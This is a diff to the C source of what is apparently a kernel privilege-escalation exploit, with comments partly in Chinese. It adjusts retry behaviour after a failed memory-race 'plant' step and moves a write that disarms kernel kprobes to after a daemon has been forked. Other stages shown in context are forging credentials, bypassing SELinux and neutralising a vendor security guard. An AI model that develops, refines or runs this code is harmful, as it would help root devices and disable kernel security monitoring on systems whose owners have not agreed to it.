@@ -102,6 +102,7 @@ static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_slide;
 static int g_held;
+static int g_allow_park = 1;
 static int g_fake_stage;
 static int g_debug_logging;
 static pid_t g_runner_pid;
@@ -2669,9 +2670,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
          * and wedges the kernel (reap hang -> watchdog reset). Park instead:
          * the caller's retry starts a FRESH process on a calmer system, which
          * is the pattern proven to land. */
-        logf("[-] plant%d burst missed; holding zombie -- parking\n", tag);
+        logf("[-] plant%d burst missed; holding zombie\n", tag);
         g_held++;
-        park_forever("burst miss");
+        if (g_allow_park)
+            park_forever("burst miss");
+        res->ok = 0;
+        return;
     }
 
     /* reap 前二次校验：victim 页若已被他方抢走，绝不 waitpid */
@@ -3363,9 +3367,7 @@ int main(int argc, char **argv)
         /* 顺序：modules_disabled 清零（安全）之后，再 disarm 全部 kprobe。
          * 2026-11-25: kprobes_disarm 的写入会导致 reap 阶段 panic（连续两轮
          * 音乐条件都崩在这一步），暂时跳过，先走 fake_cred/selinux/fake_uid。 */
-        if (KPROBES_DISARM_STATIC &&
-            stage_write(KPROBES_DISARM_STATIC + g_slide, 2, "kprobes_disarm", raw, NULL))
-            park_forever("kprobes disarm failed");
+        /* kprobes_disarm 挪到 daemon 起来之后（见 child report 后） */
         }
         /* OOS7 hooks_defend: kptr_restrict is NOT zeroed here anymore.
          * The guard's kallsyms_open/modules_open/module_sect_read pre
@@ -3455,6 +3457,13 @@ int main(int argc, char **argv)
             logf("[!] child report missing (n=%zd)\n", rn);
         }
     }
+
+    /* 2026-11-25: kprobes_disarm 后置 best-effort。
+     * daemon 已在 child 里 fork 出来，此时即使抢页失败也不影响已拿到的结果。 */
+    logf("[+] stage kprobes_disarm_late (post-daemon)");
+    if (KPROBES_DISARM_STATIC &&
+        stage_write(KPROBES_DISARM_STATIC + g_slide, 2, "kprobes_disarm_late", raw, NULL))
+        logf("[-] kprobes_disarm late miss; continuing\n");
 
     /* OOS7 hooks_defend neutralize (see the hkd_bpf_setup comment for
      * the full picture).  Sequence:
